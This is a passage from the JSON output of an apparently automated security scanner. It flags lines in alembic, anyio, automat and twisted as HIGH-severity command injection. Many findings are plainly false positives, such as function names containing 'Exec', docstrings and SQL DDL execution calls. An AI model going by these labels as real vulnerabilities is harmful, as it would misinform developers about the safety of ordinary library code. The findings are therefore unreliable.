            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/impl.py",
            "line": 415,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(",
            "context": "        new_table_name: Union[str, quoted_name],\n        schema: Optional[Union[str, quoted_name]] = None,\n    ) -> None:\n        self._exec(\n            base.RenameTable(old_table_name, new_table_name, schema=schema)\n        )\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/impl.py",
            "line": 423,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(schema.CreateTable(table, **kw))",
            "context": "        table.dispatch.before_create(\n            table, self.connection, checkfirst=False, _ddl_runner=self\n        )\n        self._exec(schema.CreateTable(table, **kw))\n        table.dispatch.after_create(\n            table, self.connection, checkfirst=False, _ddl_runner=self\n        )",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/impl.py",
            "line": 428,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(schema.CreateIndex(index))",
            "context": "            table, self.connection, checkfirst=False, _ddl_runner=self\n        )\n        for index in table.indexes:\n            self._exec(schema.CreateIndex(index))\n\n        with_comment = (\n            self.dialect.supports_comments and not self.dialect.inline_comments",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/impl.py",
            "line": 446,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(schema.DropTable(table, **kw))",
            "context": "        table.dispatch.before_drop(\n            table, self.connection, checkfirst=False, _ddl_runner=self\n        )\n        self._exec(schema.DropTable(table, **kw))\n        table.dispatch.after_drop(\n            table, self.connection, checkfirst=False, _ddl_runner=self\n        )",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/impl.py",
            "line": 452,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(schema.CreateIndex(index, **kw))",
            "context": "        )\n\n    def create_index(self, index: Index, **kw: Any) -> None:\n        self._exec(schema.CreateIndex(index, **kw))\n\n    def create_table_comment(self, table: Table) -> None:\n        self._exec(schema.SetTableComment(table))",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/impl.py",
            "line": 455,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(schema.SetTableComment(table))",
            "context": "        self._exec(schema.CreateIndex(index, **kw))\n\n    def create_table_comment(self, table: Table) -> None:\n        self._exec(schema.SetTableComment(table))\n\n    def drop_table_comment(self, table: Table) -> None:\n        self._exec(schema.DropTableComment(table))",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/impl.py",
            "line": 458,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(schema.DropTableComment(table))",
            "context": "        self._exec(schema.SetTableComment(table))\n\n    def drop_table_comment(self, table: Table) -> None:\n        self._exec(schema.DropTableComment(table))\n\n    def create_column_comment(self, column: Column[Any]) -> None:\n        self._exec(schema.SetColumnComment(column))",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/impl.py",
            "line": 461,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(schema.SetColumnComment(column))",
            "context": "        self._exec(schema.DropTableComment(table))\n\n    def create_column_comment(self, column: Column[Any]) -> None:\n        self._exec(schema.SetColumnComment(column))\n\n    def drop_index(self, index: Index, **kw: Any) -> None:\n        self._exec(schema.DropIndex(index, **kw))",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/impl.py",
            "line": 464,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(schema.DropIndex(index, **kw))",
            "context": "        self._exec(schema.SetColumnComment(column))\n\n    def drop_index(self, index: Index, **kw: Any) -> None:\n        self._exec(schema.DropIndex(index, **kw))\n\n    def bulk_insert(\n        self,",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/impl.py",
            "line": 478,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(",
            "context": "            raise TypeError(\"List of dictionaries expected\")\n        if self.as_sql:\n            for row in rows:\n                self._exec(\n                    table.insert()\n                    .inline()\n                    .values(",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/impl.py",
            "line": 499,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(table.insert().inline(), multiparams=rows)",
            "context": "        else:\n            if rows:\n                if multiinsert:\n                    self._exec(table.insert().inline(), multiparams=rows)\n                else:\n                    for row in rows:\n                        self._exec(table.insert().inline().values(**row))",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/impl.py",
            "line": 502,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(table.insert().inline().values(**row))",
            "context": "                    self._exec(table.insert().inline(), multiparams=rows)\n                else:\n                    for row in rows:\n                        self._exec(table.insert().inline().values(**row))\n\n    def _tokenize_column_type(self, column: Column) -> Params:\n        definition: str",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/mysql.py",
            "line": 93,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(",
            "context": "        if name is not None or self._is_mysql_allowed_functional_default(\n            type_ if type_ is not None else existing_type, server_default\n        ):\n            self._exec(\n                MySQLChangeColumn(\n                    table_name,\n                    column_name,",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/mysql.py",
            "line": 130,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(",
            "context": "            or autoincrement is not None\n            or comment is not False\n        ):\n            self._exec(\n                MySQLModifyColumn(\n                    table_name,\n                    column_name,",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/mysql.py",
            "line": 162,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(",
            "context": "                )\n            )\n        elif server_default is not False:\n            self._exec(\n                MySQLAlterDefault(\n                    table_name, column_name, server_default, schema=schema\n                )",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/mssql.py",
            "line": 72,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def _exec(self, construct: Any, *args, **kw) -> Optional[CursorResult]:",
            "context": "            \"mssql_batch_separator\", self.batch_separator\n        )\n\n    def _exec(self, construct: Any, *args, **kw) -> Optional[CursorResult]:\n        result = super()._exec(construct, *args, **kw)\n        if self.as_sql and self.batch_separator:\n            self.static_output(self.batch_separator)",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/mssql.py",
            "line": 73,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = super()._exec(construct, *args, **kw)",
            "context": "        )\n\n    def _exec(self, construct: Any, *args, **kw) -> Optional[CursorResult]:\n        result = super()._exec(construct, *args, **kw)\n        if self.as_sql and self.batch_separator:\n            self.static_output(self.batch_separator)\n        return result",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/mssql.py",
            "line": 154,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(",
            "context": "\n        if server_default is not False and used_default is False:\n            if existing_server_default is not False or server_default is None:\n                self._exec(\n                    _ExecDropConstraint(\n                        table_name,\n                        column_name,",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/mssql.py",
            "line": 184,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(CreateIndex(index, **kw))",
            "context": "        for col in mssql_include:\n            if col not in index.table.c:\n                index.table.append_column(Column(col, sqltypes.NullType))\n        self._exec(CreateIndex(index, **kw))\n\n    def bulk_insert(  # type:ignore[override]\n        self, table: Union[TableClause, Table], rows: List[dict], **kw: Any",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/mssql.py",
            "line": 190,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(",
            "context": "        self, table: Union[TableClause, Table], rows: List[dict], **kw: Any\n    ) -> None:\n        if self.as_sql:\n            self._exec(\n                \"SET IDENTITY_INSERT %s ON\"\n                % self.dialect.identifier_preparer.format_table(table)\n            )",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/mssql.py",
            "line": 195,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(",
            "context": "                % self.dialect.identifier_preparer.format_table(table)\n            )\n            super().bulk_insert(table, rows, **kw)\n            self._exec(\n                \"SET IDENTITY_INSERT %s OFF\"\n                % self.dialect.identifier_preparer.format_table(table)\n            )",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/mssql.py",
            "line": 212,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(",
            "context": "    ) -> None:\n        drop_default = kw.pop(\"mssql_drop_default\", False)\n        if drop_default:\n            self._exec(\n                _ExecDropConstraint(\n                    table_name, column, \"sys.default_constraints\", schema\n                )",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/mssql.py",
            "line": 219,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(",
            "context": "            )\n        drop_check = kw.pop(\"mssql_drop_check\", False)\n        if drop_check:\n            self._exec(\n                _ExecDropConstraint(\n                    table_name, column, \"sys.check_constraints\", schema\n                )",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/mssql.py",
            "line": 226,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(_ExecDropFKConstraint(table_name, column, schema))",
            "context": "            )\n        drop_fks = kw.pop(\"mssql_drop_foreign_key\", False)\n        if drop_fks:\n            self._exec(_ExecDropFKConstraint(table_name, column, schema))\n        super().drop_column(table_name, column, schema=schema, **kw)\n\n    def compare_server_default(",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/mssql.py",
            "line": 324,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec('alter table %(tname_quoted)s drop constraint ' + @const_name)\"\"\" % {",
            "context": "select @const_name = QUOTENAME([name]) from %(type)s\nwhere parent_object_id = object_id('%(schema_dot)s%(tname)s')\nand col_name(parent_object_id, parent_column_id) = '%(colname)s'\nexec('alter table %(tname_quoted)s drop constraint ' + @const_name)\"\"\" % {\n        \"type\": type_,\n        \"tname\": tname,\n        \"colname\": colname,",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/mssql.py",
            "line": 345,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec('alter table %(tname_quoted)s drop constraint ' + @const_name)\"\"\" % {",
            "context": "on fk.object_id=fkc.constraint_object_id\nwhere fkc.parent_object_id = object_id('%(schema_dot)s%(tname)s')\nand col_name(fkc.parent_object_id, fkc.parent_column_id) = '%(colname)s'\nexec('alter table %(tname_quoted)s drop constraint ' + @const_name)\"\"\" % {\n        \"tname\": tname,\n        \"colname\": colname,\n        \"tname_quoted\": format_table_name(compiler, tname, schema),",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/testing/suite/test_environment.py",
            "line": 362,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.context.impl._exec(step)",
            "context": "            elif step == \"COMMIT\":\n                self.context.impl.emit_commit()\n            else:\n                self.context.impl._exec(step)\n\n        eq_(to_check, buf.getvalue())\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/anyio/_backends/_asyncio.py",
            "line": 2561,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "                **kwargs,\n            )\n        else:\n            process = await asyncio.create_subprocess_exec(\n                *command,\n                stdin=stdin,\n                stdout=stdout,",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/automat/_test/test_visualize.py",
            "line": 36,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "return not subprocess.call(\"dot\", stdin=r, shell=True)",
            "context": "    r, w = os.pipe()\n    os.close(w)\n    try:\n        return not subprocess.call(\"dot\", stdin=r, shell=True)\n    finally:\n        os.close(r)\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/automat/_test/test_visualize.py",
            "line": 36,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "return not subprocess.call(\"dot\", stdin=r, shell=True)",
            "context": "    r, w = os.pipe()\n    os.close(w)\n    try:\n        return not subprocess.call(\"dot\", stdin=r, shell=True)\n    finally:\n        os.close(r)\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_rebuild.py",
            "line": 246,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(classDefinition, self.m.__dict__)",
            "context": "        \"\"\"\n        classDefinition = \"class SlottedClass:\\n\" \"    __slots__ = ['a']\\n\"\n\n        exec(classDefinition, self.m.__dict__)\n        inst = self.m.SlottedClass()\n        inst.a = 7\n        exec(classDefinition, self.m.__dict__)",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_rebuild.py",
            "line": 249,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(classDefinition, self.m.__dict__)",
            "context": "        exec(classDefinition, self.m.__dict__)\n        inst = self.m.SlottedClass()\n        inst.a = 7\n        exec(classDefinition, self.m.__dict__)\n        rebuild.updateInstance(inst)\n        self.assertEqual(inst.a, 7)\n        self.assertIs(type(inst), self.m.SlottedClass)",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_rebuild.py",
            "line": 260,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(classDefinition, self.m.__dict__)",
            "context": "        \"\"\"\n        classDefinition = \"class ListSubclass(list):\\n\" \"    pass\\n\"\n\n        exec(classDefinition, self.m.__dict__)\n        inst = self.m.ListSubclass()\n        inst.append(2)\n        exec(classDefinition, self.m.__dict__)",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_rebuild.py",
            "line": 263,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(classDefinition, self.m.__dict__)",
            "context": "        exec(classDefinition, self.m.__dict__)\n        inst = self.m.ListSubclass()\n        inst.append(2)\n        exec(classDefinition, self.m.__dict__)\n        rebuild.updateInstance(inst)\n        self.assertEqual(inst[0], 2)\n        self.assertIs(type(inst), self.m.ListSubclass)",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_sslverify.py",
            "line": 2825,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "cipher, eval(repr(cipher), {\"OpenSSLCipher\": sslverify.OpenSSLCipher})",
            "context": "        \"\"\"\n        cipher = sslverify.OpenSSLCipher(self.cipherName)\n        self.assertEqual(\n            cipher, eval(repr(cipher), {\"OpenSSLCipher\": sslverify.OpenSSLCipher})\n        )\n\n    def test_eqSameClass(self):",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_fdesc.py",
            "line": 236,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_setCloseOnExec(self):",
            "context": "            # POSIX seems to allow it and on macOS it happens quite a lot.\n            return untilConcludes(os.waitpid, pid, 0)[1]\n\n    def test_setCloseOnExec(self):\n        \"\"\"\n        A file descriptor passed to L{fdesc._setCloseOnExec} is not inherited\n        by a new process image created with one of the exec family of",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_fdesc.py",
            "line": 243,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "fdesc._setCloseOnExec(fObj.fileno())",
            "context": "        functions.\n        \"\"\"\n        with open(self.mktemp(), \"wb\") as fObj:\n            fdesc._setCloseOnExec(fObj.fileno())\n            status = self._execWithFileDescriptor(fObj)\n            self.assertTrue(os.WIFEXITED(status))\n            self.assertEqual(os.WEXITSTATUS(status), 0)",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_fdesc.py",
            "line": 248,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_unsetCloseOnExec(self):",
            "context": "            self.assertTrue(os.WIFEXITED(status))\n            self.assertEqual(os.WEXITSTATUS(status), 0)\n\n    def test_unsetCloseOnExec(self):\n        \"\"\"\n        A file descriptor passed to L{fdesc._unsetCloseOnExec} is inherited by\n        a new process image created with one of the exec family of functions.",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_fdesc.py",
            "line": 254,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "fdesc._setCloseOnExec(fObj.fileno())",
            "context": "        a new process image created with one of the exec family of functions.\n        \"\"\"\n        with open(self.mktemp(), \"wb\") as fObj:\n            fdesc._setCloseOnExec(fObj.fileno())\n            fdesc._unsetCloseOnExec(fObj.fileno())\n            status = self._execWithFileDescriptor(fObj)\n            self.assertTrue(os.WIFEXITED(status))",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_fdesc.py",
            "line": 255,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "fdesc._unsetCloseOnExec(fObj.fileno())",
            "context": "        \"\"\"\n        with open(self.mktemp(), \"wb\") as fObj:\n            fdesc._setCloseOnExec(fObj.fileno())\n            fdesc._unsetCloseOnExec(fObj.fileno())\n            status = self._execWithFileDescriptor(fObj)\n            self.assertTrue(os.WIFEXITED(status))\n            self.assertEqual(os.WEXITSTATUS(status), 20)",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/compat.py",
            "line": 213,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(code, globals, locals)",
            "context": "    with open(filename, \"rb\") as fin:\n        source = fin.read()\n    code = compile(source, filename, \"exec\")\n    exec(code, globals, locals)\n\n\n# type note: Can't find a Comparable type, despite",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/release.py",
            "line": 54,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "if os.system(command) != 0:",
            "context": "            return\n    if null:\n        command = \"%s > /dev/null\" % command\n    if os.system(command) != 0:\n        raise CommandFailed(command)\n\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/persisted/sob.py",
            "line": 175,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "eval(codeObj, d, d)",
            "context": "        data = fileObj.read()\n    d = {\"__file__\": filename}\n    codeObj = compile(data, filename, \"exec\")\n    eval(codeObj, d, d)\n    value = d[variable]\n    return value\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/persisted/aot.py",
            "line": 290,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "eval(code, ns, ns)",
            "context": "    else:\n        source = stringOrFile\n    code = compile(source, \"<source>\", \"exec\")\n    eval(code, ns, ns)\n\n    if \"app\" in ns:\n        return unjellyFromAOT(ns[\"app\"])",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/internet/_signals.py",
            "line": 366,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "fdesc._setCloseOnExec(self.i)",
            "context": "        \"\"\"Initialize.\"\"\"\n        self.i, self.o = os.pipe()\n        fdesc.setNonBlocking(self.i)\n        fdesc._setCloseOnExec(self.i)\n        fdesc.setNonBlocking(self.o)\n        fdesc._setCloseOnExec(self.o)\n        self.fileno = lambda: self.i",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/internet/_signals.py",
            "line": 368,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "fdesc._setCloseOnExec(self.o)",
            "context": "        fdesc.setNonBlocking(self.i)\n        fdesc._setCloseOnExec(self.i)\n        fdesc.setNonBlocking(self.o)\n        fdesc._setCloseOnExec(self.o)\n        self.fileno = lambda: self.i\n\n    def doRead(self) -> None:",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/internet/fdesc.py",
            "line": 48,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def _setCloseOnExec(fd):",
            "context": "    _setCloseOnExec = _unsetCloseOnExec = lambda fd: None\nelse:\n\n    def _setCloseOnExec(fd):\n        \"\"\"\n        Make a file descriptor close-on-exec.\n        \"\"\"",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/internet/fdesc.py",
            "line": 56,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def _unsetCloseOnExec(fd):",
            "context": "        flags = flags | fcntl.FD_CLOEXEC\n        fcntl.fcntl(fd, fcntl.F_SETFD, flags)\n\n    def _unsetCloseOnExec(fd):\n        \"\"\"\n        Make a file descriptor close-on-exec.\n        \"\"\"",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/internet/base.py",
            "line": 1340,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "fdesc._setCloseOnExec(s.fileno())",
            "context": "    def createInternetSocket(self) -> socket.socket:\n        s = socket.socket(self.addressFamily, self.socketType)\n        s.setblocking(False)\n        fdesc._setCloseOnExec(s.fileno())\n        return s\n\n    def doWrite(self) -> Optional[Failure]:",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/internet/tcp.py",
            "line": 571,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "fdesc._setCloseOnExec(s.fileno())",
            "context": "        \"\"\"\n        s = socket.socket(self.addressFamily, self.socketType)\n        s.setblocking(0)\n        fdesc._setCloseOnExec(s.fileno())\n        return s\n\n    def doConnect(self):",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/internet/tcp.py",
            "line": 1415,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "fdesc._setCloseOnExec(skt.fileno())",
            "context": "                )\n\n                for accepted, (skt, addr) in enumerate(clients, 1):\n                    fdesc._setCloseOnExec(skt.fileno())\n\n                    if len(addr) == 4:\n                        # IPv6, make sure we get the scopeID if it",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/internet/process.py",
            "line": 491,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "The exec() which is done in the forked child.",
            "context": "\n    def _execChild(self, path, uid, gid, executable, args, environment):\n        \"\"\"\n        The exec() which is done in the forked child.\n        \"\"\"\n        if path:\n            os.chdir(path)",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/internet/process.py",
            "line": 721,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(), pipe() and fcntl() when not).  These calls may not exist elsewhere",
            "context": "    output, and standard error, or any other file descriptor.\n\n    On UNIX, this is implemented using posix_spawnp() when possible (or fork(),\n    exec(), pipe() and fcntl() when not).  These calls may not exist elsewhere\n    so this code is not cross-platform.  (also, windows can only select on\n    sockets...)\n    \"\"\"",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/internet/process.py",
            "line": 964,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "fdesc._unsetCloseOnExec(child)",
            "context": "                # fd is already in place\n                if debug:\n                    print(\"%d already in place\" % target, file=errfd)\n                fdesc._unsetCloseOnExec(child)\n            else:\n                if child in fdmap.values():\n                    # we can't replace child-fd yet, as some other mapping",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/internet/process.py",
            "line": 1191,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "Set up child process after C{fork()} but before C{exec()}.",
            "context": "\n    def _setupChild(self, masterfd, slavefd):\n        \"\"\"\n        Set up child process after C{fork()} but before C{exec()}.\n\n        This involves:\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/internet/inotify.py",
            "line": 179,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "fdesc._setCloseOnExec(self._fd)",
            "context": "        self._fd = self._inotify.init()\n\n        fdesc.setNonBlocking(self._fd)\n        fdesc._setCloseOnExec(self._fd)\n\n        # The next 2 lines are needed to have self.loseConnection()\n        # to call connectionLost() on us. Since we already created the",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/web/script.py",
            "line": 93,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "eval(code, glob, glob)",
            "context": "    with open(path) as f:  # Not closed by quixote as of 2.9.1\n        e = ptl_compile.compile_template(f, path)\n    code = compile(e, \"<source>\", \"exec\")\n    eval(code, glob, glob)\n    return glob[\"resource\"]\n\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/recvline.py",
            "line": 91,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(execStr)",
            "context": "    ):\n        execBytes = keyID + b\" = object()\"\n        execStr = execBytes.decode(\"ascii\")\n        exec(execStr)\n\n    TAB = b\"\\t\"\n    BACKSPACE = b\"\\x7f\"",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/recvline.py",
            "line": 101,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(",
            "context": "        self.transports = transports\n\n    for method in insults.ITerminalTransport:\n        exec(\n            \"\"\"\\\ndef %s(self, *a, **kw):\n    for tpt in self.transports:",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/pair/testing.py",
            "line": 204,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def closeOnExec(self):",
            "context": "        return not (self.openFlags & self.system.O_NONBLOCK)\n\n    @property\n    def closeOnExec(self):\n        \"\"\"\n        If the file descriptor for this tunnel is marked as close-on-exec,\n        C{True}.  C{False} otherwise.",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/logger/test/test_logger.py",
            "line": 90,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(",
            "context": "        was specified.\n        \"\"\"\n        result: List[Logger] = []\n        exec(\n            \"result.append(Logger())\",\n            dict(Logger=Logger),\n            locals(),",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_util.py",
            "line": 361,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = eval(",
            "context": "        self.assertIn(1, dct)\n        self.assertIn(\"foo\", dct)\n\n        result = eval(\n            repr(dct),\n            {\n                \"dct\": dct,",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/internet/test/test_process.py",
            "line": 469,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "reportedChildFDs = set(eval(output.getvalue()))",
            "context": "        )\n\n        self.runReactor(reactor)\n        reportedChildFDs = set(eval(output.getvalue()))\n\n        stdFDs = [0, 1, 2]\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/internet/test/test_process.py",
            "line": 481,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_errorDuringExec(self):",
            "context": "        )\n\n    @onlyOnPOSIX\n    def test_errorDuringExec(self):\n        \"\"\"\n        When L{os.execvpe} raises an exception, it will format that exception\n        on stderr as UTF-8, regardless of system encoding information.",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/internet/test/test_process.py",
            "line": 494,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "eval(codeobj)",
